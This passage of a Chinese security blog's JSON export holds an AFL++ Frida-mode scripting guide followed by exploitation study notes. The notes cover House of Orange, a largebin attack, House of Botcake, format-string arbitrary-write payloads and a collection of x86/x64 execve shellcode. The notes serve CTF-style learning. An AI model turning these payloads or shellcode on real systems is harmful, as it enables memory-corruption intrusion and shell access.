如下的例子将目标函数中的UD2指令修改为nop指令，从而避免崩溃（UD2指令为崩溃指令）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374/* Modify the instructions */const some_boring_bug2 = DebugSymbol.fromName(&#x27;some_boring_bug2&#x27;).addressconst pid = Memory.alloc(4);pid.writeInt(Process.id);const cm = new CModule(` #include &lt;stdio.h&gt; #include &lt;gum/gumstalker.h&gt; typedef int pid_t; #define STDERR_FILENO 2 #define BORING2_LEN 10 extern int dprintf(int fd, const char *format, ...); extern void some_boring_bug2(char c); extern pid_t getpid(void); extern pid_t pid; gboolean js_stalker_callback(const cs_insn *insn, gboolean begin, gboolean excluded, GumStalkerOutput *output) &#123; pid_t my_pid = getpid(); GumX86Writer *cw = output-&gt;writer.x86; if (GUM_ADDRESS(insn-&gt;address) &lt; GUM_ADDRESS(some_boring_bug2)) &#123; return TRUE; &#125; if (GUM_ADDRESS(insn-&gt;address) &gt;= GUM_ADDRESS(some_boring_bug2) + BORING2_LEN) &#123; return TRUE; &#125; if (my_pid == pid) &#123; if (begin) &#123; dprintf(STDERR_FILENO, &quot;\\n&gt; 0x%016lX: %s %s\\n&quot;, insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str); &#125; else &#123; dprintf(STDERR_FILENO, &quot; 0x%016lX: %s %s\\n&quot;, insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str); &#125; &#125; if (insn-&gt;id == X86_INS_UD2) &#123; gum_x86_writer_put_nop(cw); return FALSE; &#125; else &#123; return TRUE; &#125; &#125; `, &#123; dprintf: Module.getExportByName(null, &#x27;dprintf&#x27;), getpid: Module.getExportByName(null, &#x27;getpid&#x27;), some_boring_bug2: some_boring_bug2, pid: pid &#125;);Afl.setStalkerCallback(cm.js_stalker_callback)Afl.setStdErr(&quot;/tmp/stderr.txt&quot;); 注意你可能更喜欢用如下的代码找到patch地址。 123const module = Process.getModuleByName(&#x27;target.exe&#x27;);/* Hardcoded offset within the target image */const address = module.base.add(0xdeadface); OR 1const address = DebugSymbol.fromName(&quot;my_function&quot;).address.add(0xdeadface); OR 1const address = Module.getExportByName(null, &quot;my_function&quot;).add(0xdeadface); 若原函数的原始指令没有更更改，则函数js_stalker_callback应该返回TRUE,否则返回FALSE。在上述的例子中，我们可以看到原始指令被替换成NOP指令。 最后注意：应保持forkserver父子进程的代码相同或forkserver每次产生的子进程代码相同，否则会产生难以调试的bug【原文： note that the same callback will be called when compiling instrumented code both in the child of the forkserver (as it is executed) and also in the parent of the forkserver (when prefetching is enabled) so that it can be inherited by the next forked child. It is VERY important that the same instructions be generated in both the parent and the child or if prefetching is disabled that the same instructions are generated every time the block is compiled. Failure to do so will likely lead to bugs which are incredibly difficult to diagnose. The code above only prints the instructions when running in the parent process (the one provided by Process.id when the JS script is executed).】 OSX 注意OSX上JavaScript的调试符号api使用CoreSymbolicationAPI，因此目标进程需要加载和使用CoreFoundation模块，如下设定： 1AFL_PRELOAD=/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation 应该被注意的是CoreSymbolicationAPI在初始化和创建cache的时候较慢，因此，需要增加afl-fuzz的-t参数的值，避免超时。 API 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277class Afl &#123; /** * This is equivalent to setting a value in `AFL_FRIDA_EXCLUDE_RANGES`, * it takes as arguments a `NativePointer` and a `number`. It can be * called multiple times to exclude several ranges. */ static addExcludedRange(addressess, size) &#123; Afl.jsApiAddExcludeRange(addressess, size); &#125; /** * This is equivalent to setting a value in `AFL_FRIDA_INST_RANGES`, * it takes as arguments a `NativePointer` and a `number`. It can be * called multiple times to include several ranges. */ static addIncludedRange(addressess, size) &#123; Afl.jsApiAddIncludeRange(addressess, size); &#125; /** * This must always be called at the end of your script. This lets * FRIDA mode know that your configuration is finished and that * execution has reached the end of your script. Failure to call * this will result in a fatal error. */ static done() &#123; Afl.jsApiDone(); &#125; /** * This function can be called within your script to cause FRIDA * mode to trigger a fatal error. This is useful if for example you * discover a problem you weren&#x27;t expecting and want everything to * stop. The user will need to enable `AFL_DEBUG_CHILD=1` to view * this error message. */ static error(msg) &#123; const buf = Memory.allocUtf8String(msg); Afl.jsApiError(buf); &#125; /** * Function used to provide access to `__afl_fuzz_ptr`, which contains the length of * fuzzing data when using in-memory test case fuzzing. */ static getAflFuzzLen() &#123; return Afl.jsApiGetSymbol(&quot;__afl_fuzz_len&quot;); &#125; /** * Function used to provide access to `__afl_fuzz_ptr`, which contains the fuzzing * data when using in-memory test case fuzzing. */ static getAflFuzzPtr() &#123; return Afl.jsApiGetSymbol(&quot;__afl_fuzz_ptr&quot;); &#125; /** * Print a message to the STDOUT. This should be preferred to * FRIDA&#x27;s `console.log` since FRIDA will queue it&#x27;s log messages. * If `console.log` is used in a callback in particular, then there * may no longer be a thread running to service this queue. */ static print(msg) &#123; const STDOUT_FILENO = 2; const log = `$&#123;msg&#125;\\n`; const buf = Memory.allocUtf8String(log); Afl.jsApiWrite(STDOUT_FILENO, buf, log.length); &#125; /** * See `AFL_FRIDA_STALKER_NO_BACKPATCH`. */ static setBackpatchDisable() &#123; Afl.jsApiSetBackpatchDisable(); &#125; /** * See `AFL_FRIDA_DEBUG_MAPS`. */ static setDebugMaps() &#123; Afl.jsApiSetDebugMaps(); &#125; /** * This has the same effect as setting `AFL_ENTRYPOINT`, but has the * convenience of allowing you to use FRIDAs APIs to determine the * address you would like to configure, rather than having to grep * the output of `readelf` or something similarly ugly. This * function should be called with a `NativePointer` as its * argument. */ static setEntryPoint(address) &#123; Afl.jsApiSetEntryPoint(address); &#125; /** * Function used to enable in-memory test cases for fuzzing. */ static setInMemoryFuzzing() &#123; Afl.jsApiAflSharedMemFuzzing.writeInt(1); &#125; /** * See `AFL_FRIDA_INST_COVERAGE_FILE`. This function takes a single `string` * as an argument. */ static setInstrumentCoverageFile(file) &#123; const buf = Memory.allocUtf8String(file); Afl.jsApiSetInstrumentCoverageFile(buf); &#125; /** * See `AFL_FRIDA_INST_DEBUG_FILE`. This function takes a single `string` as * an argument. */ static setInstrumentDebugFile(file) &#123; const buf = Memory.allocUtf8String(file); Afl.jsApiSetInstrumentDebugFile(buf); &#125; /** * See `AFL_FRIDA_INST_TRACE`. */ static setInstrumentEnableTracing() &#123; Afl.jsApiSetInstrumentTrace(); &#125; /** * See `AFL_FRIDA_INST_JIT`. */ static setInstrumentJit() &#123; Afl.jsApiSetInstrumentJit(); &#125; /** * See `AFL_INST_LIBS`. */ static setInstrumentLibraries() &#123; Afl.jsApiSetInstrumentLibraries(); &#125; /** * See `AFL_FRIDA_INST_NO_OPTIMIZE` */ static setInstrumentNoOptimize() &#123; Afl.jsApiSetInstrumentNoOptimize(); &#125; /* * See `AFL_FRIDA_INST_SEED` */ static setInstrumentSeed(seed) &#123; Afl.jsApiSetInstrumentSeed(seed); &#125; /** * See `AFL_FRIDA_INST_TRACE_UNIQUE`. */ static setInstrumentTracingUnique() &#123; Afl.jsApiSetInstrumentTraceUnique(); &#125; /** * See `AFL_FRIDA_INST_UNSTABLE_COVERAGE_FILE`. This function takes a single * `string` as an argument. */ static setInstrumentUnstableCoverageFile(file) &#123; const buf = Memory.allocUtf8String(file); Afl.jsApiSetInstrumentUnstableCoverageFile(buf); &#125; /* * Set a callback to be called in place of the usual `main` function. This see * `Scripting.md` for details. */ static setJsMainHook(address) &#123; Afl.jsApiSetJsMainHook(address); &#125; /** * This is equivalent to setting `AFL_FRIDA_PERSISTENT_ADDR`, again a * `NativePointer` should be provided as it&#x27;s argument. */ static setPersistentAddress(address) &#123; Afl.jsApiSetPersistentAddress(address); &#125; /** * This is equivalent to setting `AFL_FRIDA_PERSISTENT_CNT`, a * `number` should be provided as it&#x27;s argument. */ static setPersistentCount(count) &#123; Afl.jsApiSetPersistentCount(count); &#125; /** * See `AFL_FRIDA_PERSISTENT_DEBUG`. */ static setPersistentDebug() &#123; Afl.jsApiSetPersistentDebug(); &#125; /** * See `AFL_FRIDA_PERSISTENT_ADDR`. This function takes a NativePointer as an * argument. See above for examples of use. */ static setPersistentHook(address) &#123; Afl.jsApiSetPersistentHook(address); &#125; /** * This is equivalent to setting `AFL_FRIDA_PERSISTENT_RET`, again a * `NativePointer` should be provided as it&#x27;s argument. */ static setPersistentReturn(address) &#123; Afl.jsApiSetPersistentReturn(address); &#125; /** * See `AFL_FRIDA_INST_NO_PREFETCH_BACKPATCH`. */ static setPrefetchBackpatchDisable() &#123; Afl.jsApiSetPrefetchBackpatchDisable(); &#125; /** * See `AFL_FRIDA_INST_NO_PREFETCH`. */ static setPrefetchDisable() &#123; Afl.jsApiSetPrefetchDisable(); &#125; /** * See `AFL_FRIDA_SECCOMP_FILE`. This function takes a single `string` as * an argument. */ static setSeccompFile(file) &#123; const buf = Memory.allocUtf8String(file); Afl.jsApiSetSeccompFile(buf); &#125; /** * See `AFL_FRIDA_STALKER_ADJACENT_BLOCKS`. */ static setStalkerAdjacentBlocks(val) &#123; Afl.jsApiSetStalkerAdjacentBlocks(val); &#125; /* * Set a function to be called for each instruction which is instrumented * by AFL FRIDA mode. */ static setStalkerCallback(callback) &#123; Afl.jsApiSetStalkerCallback(callback); &#125; /** * See `AFL_FRIDA_STALKER_IC_ENTRIES`. */ static setStalkerIcEntries(val) &#123; Afl.jsApiSetStalkerIcEntries(val); &#125; /** * See `AFL_FRIDA_STATS_FILE`. This function takes a single `string` as * an argument. */ static setStatsFile(file) &#123; const buf = Memory.allocUtf8String(file); Afl.jsApiSetStatsFile(buf); &#125; /** * See `AFL_FRIDA_STATS_INTERVAL`. This function takes a `number` as an * argument */ static setStatsInterval(interval) &#123; Afl.jsApiSetStatsInterval(interval); &#125; /** * See `AFL_FRIDA_OUTPUT_STDERR`. This function takes a single `string` as * an argument. */ static setStdErr(file) &#123; const buf = Memory.allocUtf8String(file); Afl.jsApiSetStdErr(buf); &#125; /** * See `AFL_FRIDA_OUTPUT_STDOUT`. This function takes a single `string` as * an argument. */ static setStdOut(file) &#123; const buf = Memory.allocUtf8String(file); Afl.jsApiSetStdOut(buf); &#125; /** * See `AFL_FRIDA_TRACEABLE`. */ static setTraceable() &#123; Afl.jsApiSetTraceable(); &#125; static jsApiGetFunction(name, retType, argTypes) &#123; const addr = Afl.module.getExportByName(name); return new NativeFunction(addr, retType, argTypes); &#125; static jsApiGetSymbol(name) &#123; return Afl.module.getExportByName(name); &#125;&#125;","categories":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://www.4x7.fun/categories/Fuzz/"}],"tags":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://www.4x7.fun/tags/Fuzz/"},{"name":"Blind-Fuzz","slug":"Blind-Fuzz","permalink":"http://www.4x7.fun/tags/Blind-Fuzz/"},{"name":"AFL++","slug":"AFL","permalink":"http://www.4x7.fun/tags/AFL/"},{"name":"Frida","slug":"Frida","permalink":"http://www.4x7.fun/tags/Frida/"}]},{"title":"HeapAttack: House_of_Orange","slug":"HeapAttack-House-of-Orange","date":"2022-03-25T07:02:22.000Z","updated":"2022-03-25T07:02:22.000Z","comments":true,"path":"2022/03/25/HeapAttack-House-of-Orange/","link":"","permalink":"http://www.4x7.fun/2022/03/25/HeapAttack-House-of-Orange/","excerpt":"","text":"漏洞样式 漏洞要求：libc-leak， 任意地址写(_IO_list_all劫持), 大块chunk控制(伪造_IO_FILE结构) libc版本：glibc-2.3及以下 2. 利用方法 2.1 攻击效果 GetShell： 通过劫持_IO_list_all.vtable中某函数指针，篡改为system或one_gadget, 并伪造_IO_FILE结构从而使程序在调用 _IO_flush_all_lockp 函数后能够最终调用到system或one_gadet。_IO_flush_all_lockp 2.2 过程简述 使用unsortedbin attack，largebin attack，tcache dup、House Of Botcake等任意地址写技术将_IO_list_all改写为攻击者可控内存地址(记为fakeIOList)。 在fakeIOList上布置内存布局，使得以类型Struct _IO_File 解析fakeIOList a. fp-&gt;_mode &lt;= 0 b. fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base vtable 指向可控内存区域，修改 vtable-&gt;__overflow 为目标函数(system或者one_gadget) [可选的]若vtable-&gt;__overflow指向system。可将fp-&gt;_flags 写成b&quot;/bin/sh\\0&quot;。因为最终调用的代码是： _IO_OVERFLOW (fp, EOF) 即 fp-&gt;vtable-&gt;__overflow(fp) 3. 注意 参考链接(IO FILE 之劫持vtable及FSOP)中的以下两个技巧的学习： 通过mmap 0x200000的超大chunk，该chunk会恰好分配在libc的上方，这样可以leak libc地址。 当top_chunk size不够分配内存时，main_arena会sbrk新的page；若旧top_chunk的末尾地址与sbrk新分配内存的开始地址不邻接，则会把旧top_chunk free掉。我们这样就不经过free获得了一个unsortedbin chunk。 参考 IO FILE 之劫持vtable及FSOP IO FILE 之vtable check 以及绕过 从零开始的Linux堆利用(七)——House of Orange","categories":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/categories/HeapAttack/"},{"name":"FSOP","slug":"HeapAttack/FSOP","permalink":"http://www.4x7.fun/categories/HeapAttack/FSOP/"}],"tags":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/tags/HeapAttack/"},{"name":"_IO_list_all","slug":"IO-list-all","permalink":"http://www.4x7.fun/tags/IO-list-all/"},{"name":"unsortedbin attack","slug":"unsortedbin-attack","permalink":"http://www.4x7.fun/tags/unsortedbin-attack/"},{"name":"FSOP","slug":"FSOP","permalink":"http://www.4x7.fun/tags/FSOP/"}]},{"title":"HeapAttack: LargeBin Attack","slug":"HeapAttack-LargeBinAttack","date":"2022-03-23T13:16:30.000Z","updated":"2022-04-11T02:15:12.000Z","comments":true,"path":"2022/03/23/HeapAttack-LargeBinAttack/","link":"","permalink":"http://www.4x7.fun/2022/03/23/HeapAttack-LargeBinAttack/","excerpt":"","text":"1. 漏洞样式 漏洞要求：Write After Free chunk大小：可申请 large bin(即size&gt;=0x400) 2. 利用方法 2.1 攻击效果 在unsorted-bin chunk被sort进large-bin时，触发任意地址写, 可以往任意地址中写入一个不可控的未知大数 (实际为某堆地址)。 实现以下目的： 修改循环次数 修改global_max_fast 或arena-&gt;max_fast的值，从而把size&gt;0x80的chunk分配到fastbin中;或者在目标二进制使用mallopt(M_MXFAST,0)禁用fastbin后，重新启用 修改能够输出的变量，从而泄露堆地址 2.2 过程简述 假设堆状态如下： unsorted-bin: A(0x400) large-bin: 0x400： B(0x410) 若 B 存在Write After Free, 则修改 B-&gt;bk_nextsize 为 目标地址(target) 。 触发A加入到large-bin链表中，则会导致 A-&gt;bk_nextsize = B-&gt;bk_nextsize; A-&gt;bk_nextsize-&gt;fd_nextsize = B 即 target-&gt;fd_nextsize = A 。 即 unsorted-bin: large-bin: 0x400: B(0x410) -&gt; A(0x400) [A插入时触发攻击] 2.3 代码表示 12345678910111213141516171819202122232425262728static uint64_t target; //假设需要被更改值的目标地址int attack()&#123; void* A, * B, * C; A = malloc(0x400 - 8); //A小 malloc(0x18); B = malloc(0x410 - 8); //B大 malloc(0x18); free(B); // unsortedbin: B // largebin: empty malloc(0x600); // unsortedbin: empty // largebin: 0x400: B(0x410) free(A)； // unsortedbin: A // largebin: 0x400: B(0x410) * ( uint64_t * )(B + 0x18) = ( uint64_t ) ( &amp;target ) - 0x20 //edit: B-&gt;bk_nextsize = target_over &amp;&amp; let: target_over-&gt;fd_nextsize = target malloc(0x600); // unsortedbin: empty // largebin: 0x400: B(0x410)-&gt;A(0x400) &#123;触发：A-&gt;bk_nextsize-&gt;fd_nextsize = A&#125;&#125; 3. 原理分析 在glibc项目malloc.c文件_int_malloc函数中： 在chunk被从unsortedbin中sort下来之后的代码部分 1234567891011121314151617181920212223242526272829303132333435363738. . . /* place chunk in bin */ //// 若smallbin范围 if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else ////若在largebin范围 &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; //// largebin:: [bck]: fwd /* maintain large bins in sorted order * / if (fwd != bck) //// largebin不为空 &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) ////确认victim为最小，因此插入到链表最后 &#123; fwd = bck; bck = bck-&gt;bk; //// largebin:: [fwd]: bck //// 等同于2节例子中：[av]: B victim-&gt;fd_nextsize = fwd-&gt;fd; ////fwd-&gt;fd 即为bck,也就是例子里的B victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; //// 因此victim-&gt;bk_nextsize = bck-&gt;bk_nextsize (即A-&gt;bk_nextsize = B-&gt;bk_nextsize) fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; ////即bck-&gt;bk_nextsize = bck-&gt;bk_nextsize-&gt;fd_nextsize = victim ////即例子：B-&gt;bk_nextsize = B-&gt;bk_nextsize-&gt;fd_nextsize = A ////==&gt; largebin attack的精髓即：B-&gt;bk_nextsize-&gt;fd_nextsize = A， ////==&gt; 而它通过两步计算得到：victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; 和 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; 参考 heap_exploit_2.31/largebin_attack.c","categories":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/categories/HeapAttack/"}],"tags":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/tags/HeapAttack/"},{"name":"LargeBinAttack","slug":"LargeBinAttack","permalink":"http://www.4x7.fun/tags/LargeBinAttack/"},{"name":"Arbitrary Write","slug":"Arbitrary-Write","permalink":"http://www.4x7.fun/tags/Arbitrary-Write/"},{"name":"Write After Free","slug":"Write-After-Free","permalink":"http://www.4x7.fun/tags/Write-After-Free/"}]},{"title":"Shellcode Collection","slug":"shellcode","date":"2022-03-21T12:44:19.000Z","updated":"2022-04-11T02:15:12.000Z","comments":true,"path":"2022/03/21/shellcode/","link":"","permalink":"http://www.4x7.fun/2022/03/21/shellcode/","excerpt":"","text":"32位 有&quot;\\x00&quot;最短 20 byte 12345678910shellcode= &#x27;&#x27;&#x27; xor ecx,ecx mul ecx mov al,0xb push 0x68732f push 0x6e69622f mov ebx,esp int 0x80 &#x27;&#x27;&#x27; shellcode=asm(shellcode) 无&quot;\\x00&quot;最短 21 byte 12345678xor ecx,ecxmul ecxpush eaxmov al,0xbpush 0x68732f2f push 0x6e69622f mov ebx,espint 0x80 标准shellcode 23 byte 123456789xor ecx,ecxxor edx,edxpush edxpush 0x68732f2fpush 0x6e69622fmov ebx,espxor eax,eaxmov al,0xBint 0x80 64位 最短有&quot;\\x00&quot; 22 byte 12345678xor rsi,rsimul esimov rbx,0x68732f6e69622fpush rbxpush rsppop rdimov al, 59syscall 最短无&quot;\\x00&quot; 23 byte 123456789xor rsi,rsimul esipush raxmov rbx,0x68732f2f6e69622fpush rbxpush rsppop rdimov al, 59syscall 标准shellcode 31 byte 12345678910xor rdi,rdixor rsi,rsixor rdx,rdxxor rax,raxpush raxmov rbx,0x68732f2f6e69622fpush rbxmov rdi,rspmov al,0x3bsyscall 转载自: Linux_ShellCode","categories":[{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/categories/shellcode/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/tags/shellcode/"}]},{"title":"HeapAttack: House_of_Botcake","slug":"HeapAttack-House-of-Botcake","date":"2022-03-18T12:16:10.000Z","updated":"2022-04-11T02:15:12.000Z","comments":true,"path":"2022/03/18/HeapAttack-House-of-Botcake/","link":"","permalink":"http://www.4x7.fun/2022/03/18/HeapAttack-House-of-Botcake/","excerpt":"","text":"1. 漏洞样式 glibc版本：≥ 2.3.1 Tcache：开启 漏洞要求：double free 2. 利用方法 2.1 攻击效果 绕过Tcache的 tcache-dup 检查，将 可控chunk 插入 Tcache-list,修改 可控chunk 的 fd 字段，从而 最终实现 任意地址写’。 2.2 攻击过程 伪代码表示如下 123456789101112131415161718192021222324252627size = 0x108mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunka = malloc(size) b = malloc(size) #a,b chunk是主角malloc(0x18) #和top_chunk隔离，防止forward-consolidation[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满free(a) #因tcache已满，a、b进unsorted-binfree(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中malloc(size) #一次分配后tcache有一个空位free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlappayload = size * b&quot;\\0&quot; + p64(size) + p64(target_address) #不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fdwrite(c, payload) ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunktarget_memory = malloc(size)write(target_memory, arbitrary_value) 参考： heap_exploit_2.31/house_of_botcake.c","categories":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/categories/HeapAttack/"},{"name":"tcache","slug":"HeapAttack/tcache","permalink":"http://www.4x7.fun/categories/HeapAttack/tcache/"}],"tags":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/tags/HeapAttack/"},{"name":"House_of_Botcake","slug":"House-of-Botcake","permalink":"http://www.4x7.fun/tags/House-of-Botcake/"},{"name":"tcache","slug":"tcache","permalink":"http://www.4x7.fun/tags/tcache/"}]},{"title":"Format-String Attack","slug":"fmtstr_attack","date":"2022-03-18T03:42:27.000Z","updated":"2022-04-11T02:15:12.000Z","comments":true,"path":"2022/03/18/fmtstr_attack/","link":"","permalink":"http://www.4x7.fun/2022/03/18/fmtstr_attack/","excerpt":"","text":"1. 漏洞样式 通常情况下漏洞程序样式： Table 1. Vulnerable Code Demo 123char buffer[1024];gets(buffer, 1024);printf(buffer); 字符串 buffer 可控且作为 printf 的第一个参数。当其中包含 格式化字符(例如%s, %d, %p等) 时，栈上的内容就会被当做printf的第2个、第3个参数等被输出。 2. 利用方法 2.1 确定偏移 输入字符串（即Table 1中buffer）在栈上的偏移，即buffer被printf当做参数时，作为第几个参数。参数序号从0开始： printf(arg0, arg1, arg2, …, argn); 第10参数即表示arg10 步骤1. break printf ；即在 printf 下断点 步骤2. 输入 %p%p%p%p 等特殊字符 步骤3. 在 printf 函数断点，使用 stack 命令查看栈。找到 %p%p%p%p 特殊字符串在栈上的位置。如Figure 1所示。 Figure 1. printf stack illustration 需注意图中①断点在printf入口，已跳转到printf 但尚未执行printf中指令（尤其是栈指令，否则栈布局会改变）；注意图中② 0b 即字符串 %p%p%p%p 距离栈顶( esp )的偏移为 11；由于在 esp + 0 的位置存放函数返回地址。因此 %p%p%p%p 字符串实际上位于 栈上 第 10 个参数。 步骤4. 根据不同架构确定 buffer 在 printf 函数参数的序号。参考函数调用约定。 a). x86架构 x86架构的函数参数全部通过栈传递， 因此 buffer 是 printf 的第10个参数。 b). x64架构 x64传参顺序为rdi, rsi, rdx, rcx, r8, r9; 之后才使用栈传参。因此若 Figure 1 在x64架构中，buffer对应的是printf函数的第（0xb + 6 - 1)= 16 个参数(参数序号从0开始，0，1，2，…, 16)。 2.2 实现任意地址写 往 任意目标地址(记为target_address) 中写入 任意值(记为target_value) 。 1). 任意值的控制：通过格式化字符串 %Mc 其中 M=target_value来操控 2). 任意地址的控制：将目标地址(target_address)写入buffer字符串中；并通过格式化字符串 %N$n来指定将 *当前printf已经输字符个数* 写入到第 N 个参数指定的地址中。其中 N即为’使用2.1中方法确定的‘’在buffer字符串中的‘’target_address在栈上的位置对应的printf的参数序号‘。(该处使用’'分句停顿帮助阅读) 例如： 2.2.1 当target_value 较小时，直接写入 假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位） Table 2. Payload Demo 1 12// 写4到target_addresspayload1 = p32(target_address) + b&#x27;%10$n\\0&#x27; 其中： payload1实现写4(p32为4byte)到target_address Table 3. Payload Demo 2 123payload2 = b&#x27;%100c&#x27; + b&#x27;%13$n&#x27;payload2 = payload2.ljust(12, b&#x27;a&#x27;)payload2 += p32(target_address) payload2实现写100到target_address, 此处由于target_adress没有写在字符串的开头，因此需要重新计算在栈上的偏移：字符串开头位于arg10处，字符串中target_address之前有12个字符即占3个参数位，因此target_address对应的参数位为13 2.2.2 当target_value太大时，分字节写入 假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）；且需要向target_address 中写入的target_value为*0xbaedbeef*。 实际上就是令： *(int8*)target_address = 0xef = 239 *(int8*)(target_address + 1) = 0xbe = 190 *(int8*)(target_address + 2) = 0xed = 237 *(int8*)(target_address + 3) = 0xba = 186 这种情况下使用 %N$hhn 向目标地址写入int8宽度值 和 使用 %N$hn 向目标地址写入int16宽度值，将会非常有用。 那么可以使用如下payload实现： Table 4. Payload Demo 3 12345678910111213payload = p32(target_address) //arg10payload += p32(target_address + 1) //arg11payload += p32(target_address + 2) //arg12payload += p32(target_address + 3) //arg13//已有16byte输出；写入时从小到大写；即186-&gt;190-&gt;237-&gt;239// 186 - 16 = 170payload += b&quot;%170c%13$hhn&quot;// 190 - 186 = 4payload += b&quot;%4c%11$hhn&quot;// 237 - 190 = 47payload += b&quot;%47c%12$hhn&quot;// 239 - 237 = 2payload += b&quot;%2c%10$hhn&quot; 2.2.3 使用pwnlib的fmtstr_payload函数自动构造payload 示例如下： Table 5. Payload Demo 4: fmtstr_payload 12345from pwn import *from pwnlib.util import misc//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)io.send(payload) 2. 注意事项 3. 原理说明 参考： fmtstr_attack on ctf-wiki","categories":[{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/categories/Format-String/"}],"tags":[{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/tags/Format-String/"}]},{"title":"404","slug":"404","date":"2022-02-23T11:48:56.000Z","updated":"2022-03-24T12:50:00.000Z","comments":true,"path":"/404.html","link":"","permalink":"http://www.4x7.fun/404.html","excerpt":"","text":"Page Not Found","categories":[],"tags":[{"name":"404","slug":"404","permalink":"http://www.4x7.fun/tags/404/"}]}],"categories":[{"name":"Write Up","slug":"Write-Up","permalink":"http://www.4x7.fun/categories/Write-Up/"},{"name":"Format String Attack","slug":"Write-Up/Format-String-Attack","permalink":"http://www.4x7.fun/categories/Write-Up/Format-String-Attack/"},{"name":"Fuzz","slug":"Fuzz","permalink":"http://www.4x7.fun/categories/Fuzz/"},{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/categories/HeapAttack/"},{"name":"FSOP","slug":"HeapAttack/FSOP","permalink":"http://www.4x7.fun/categories/HeapAttack/FSOP/"},{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/categories/shellcode/"},{"name":"tcache","slug":"HeapAttack/tcache","permalink":"http://www.4x7.fun/categories/HeapAttack/tcache/"},{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/categories/Format-String/"}],"tags":[{"name":"Write Up","slug":"Write-Up","permalink":"http://www.4x7.fun/tags/Write-Up/"},{"name":"Format String Attack","slug":"Format-String-Attack","permalink":"http://www.4x7.fun/tags/Format-String-Attack/"},{"name":"Fuzz","slug":"Fuzz","permalink":"http://www.4x7.fun/tags/Fuzz/"},{"name":"Blind-Fuzz","slug":"Blind-Fuzz","permalink":"http://www.4x7.fun/tags/Blind-Fuzz/"},{"name":"AFL++","slug":"AFL","permalink":"http://www.4x7.fun/tags/AFL/"},{"name":"Frida","slug":"Frida","permalink":"http://www.4x7.fun/tags/Frida/"},{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/tags/HeapAttack/"},{"name":"_IO_list_all","slug":"IO-list-all","permalink":"http://www.4x7.fun/tags/IO-list-all/"},{"name":"unsortedbin attack","slug":"unsortedbin-attack","permalink":"http://www.4x7.fun/tags/unsortedbin-attack/"},{"name":"FSOP","slug":"FSOP","permalink":"http://www.4x7.fun/tags/FSOP/"},{"name":"LargeBinAttack","slug":"LargeBinAttack","permalink":"http://www.4x7.fun/tags/LargeBinAttack/"},{"name":"Arbitrary Write","slug":"Arbitrary-Write","permalink":"http://www.4x7.fun/tags/Arbitrary-Write/"},{"name":"Write After Free","slug":"Write-After-Free","permalink":"http://www.4x7.fun/tags/Write-After-Free/"},{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/tags/shellcode/"},{"name":"House_of_Botcake","slug":"House-of-Botcake","permalink":"http://www.4x7.fun/tags/House-of-Botcake/"},{"name":"tcache","slug":"tcache","permalink":"http://www.4x7.fun/tags/tcache/"},{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/tags/Format-String/"},{"name":"404","slug":"404","permalink":"http://www.4x7.fun/tags/404/"}]}